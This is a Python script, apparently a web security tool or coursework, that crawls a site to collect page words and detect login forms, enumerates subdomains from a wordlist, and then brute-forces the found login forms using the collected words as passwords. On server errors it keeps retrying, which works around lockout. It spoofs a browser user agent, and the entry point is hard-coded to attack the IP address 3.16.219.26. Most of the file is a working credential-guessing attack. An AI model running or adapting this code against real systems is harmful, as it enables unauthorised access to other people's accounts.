from html_parser import HTMLParser
from requests import get_request, get_status, post_request
from url_utils import extract_url_parts, reformat_url
import collections
import password_generator
import socket

password_list = []
MAX_DEPTH = 10
SUBDOMAINS_FILE_PATH = './subdomains-100.txt'

class Node:
    def __init__(self, url, depth):
        self.url = url
        self.depth = depth

def add_duplicate_url(url, seen):
    # If the URL has a trailing slash, add the URL without the slash to set of seen nodes
    if url[-1] == '/':
        seen.add(url[:-1])
        
    # Else the URL doesn't have a trailing slash and add the URL with a slash to set of seen nodes
    else:
        seen.add(url + '/')       

def process_node(start_url, node, header_dict, forms, keywords, seen, add_next):
    print('Depth ' + str(node.depth) + ': Processing: ' + node.url)

    # Make GET request to the current URL      
    html_doc = get_request(node.url, header_dict)
    if html_doc is not None:
        parser = HTMLParser(html_doc)

        # Extract and add words from current page to the set of keywords
        keywords |= parser.extract_words()

        # If a login form is found, add it to the set
        form_found = parser.detect_login_form()
        if form_found:
            forms.add(node.url)
        
        # Add reachable URLs from current node if its depth < max depth
        if node.depth < MAX_DEPTH:
            # Retrieve set of URLs reachable from current node 
            linked_urls = parser.extract_urls()

            for url in linked_urls:
                # Reformat if relative url given
                if 'http' not in url:
                    url = reformat_url(url, node.url)                 

                if url not in seen and url.startswith(start_url):
                    seen.add(url)
                    add_duplicate_url(url, seen)
                    # Traversal dependent function to add next node
                    add_next(url) 

def crawl_bfs(start_url, header_dict):
    print('Starting Breadth-First Crawling')
    print('-' * 50)
    forms = set()
    keywords = set()
    seen = set()
    queue = collections.deque()
    
    # Add start URL to the queue and set of seen URLs
    start_node = Node(start_url, 0)
    queue.append(start_node)
    seen.add(start_node.url)
    add_duplicate_url(start_node.url, seen)

    # While queue is not empty
    while queue:
        node = queue.popleft()
        add_to_queue = lambda url: queue.append(Node(url, node.depth + 1))  
        process_node(start_url, node, header_dict, forms, keywords, seen, add_to_queue)
        
    return keywords, forms, seen

def crawl_dfs(start_url, header_dict):
    """ Wrapper function to initialize first call to recursive DFS crawl function """
    
    print('Starting Depth-First Crawling')
    print('-' * 50)    
    forms = set()
    keywords = set()
    seen = set()

    start_node = Node(start_url, 0)
    # Add start URL to the set of seen URLs
    seen.add(start_node.url)
    add_duplicate_url(start_node.url, seen)
    
    _crawl_dfs(start_url, start_node, header_dict, forms, keywords, seen)
    return keywords, forms, seen

def _crawl_dfs(start_url, node, header_dict, forms, keywords, seen):
    add_to_stack = lambda url: _crawl_dfs(start_url, Node(url, node.depth + 1), header_dict, forms, keywords, seen)
    process_node(start_url, node, header_dict, forms, keywords, seen, add_to_stack) 

def read_subdomains():
    with open(SUBDOMAINS_FILE_PATH, "r") as f:
        return {subdomain.rstrip() for subdomain in f}

def get_subdomains(url):
    subdomains = read_subdomains()
    host, _, _ = extract_url_parts(url)
    
    url_subdomain = host.split('.')[0] # Subdomain of given URL
    
    # Check to see if the URL already has a subdomain from the list
    if url_subdomain in subdomains:
        host = host.replace(url_subdomain + '.', '')

    return {subdomain + '.' + host for subdomain in subdomains}

def crawl_subdomains(bfs, url, header_dict):
    for subdomain in get_subdomains(url):
        try:
            conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            # Test whether subdomain exists 
            conn.connect((subdomain, 80))
            if bfs:
                crawl_bfs(subdomain, header_dict)
            else:
                crawl_dfs(subdomain, header_dict)            
        except socket.gaierror:
            print('Subdomain ' + subdomain + ' was not found.')
        finally:
            conn.close()    
            
def brute_force(user, passwords, forms, user_agent):
    for form in forms:
        print('\nAttempting to brute-force: ' + form + '\n')
        get_header = {'User-Agent': user_agent}
        html_doc = get_request(form, get_header)
        parser = HTMLParser(html_doc)

        for password in passwords:
            login = parser.create_login_string(user, password)
            post = {'User-Agent': user_agent,
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'Content-Length': str(len(login))}

            response = post_request(form, post, login)
            
            if get_status(response) >= 500:
                print('Hold on, too many failed attempts! Waiting for the server to accept more login requests...')
            
            # Continually retry logging in if there is a server error (too many failed attempts)
            while get_status(response) >= 500:
                response = post_request(form, post, login)
            print('Attempting to login...\nUser: ' + user + '\nPassword: ' + password)
            if get_status(response) == 302:
                print('Login Succeeded!\n')
                break
            else:
                print('Login Failed...\n')
          
def web_crawler():
    url = reformat_url('3.16.219.26')

    keywords_bfs, forms_bfs, seen_bfs = crawl_bfs(url, {})

    brute_force('user', keywords_bfs, forms_bfs, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246')


if __name__ == '__main__':
    web_crawler()
    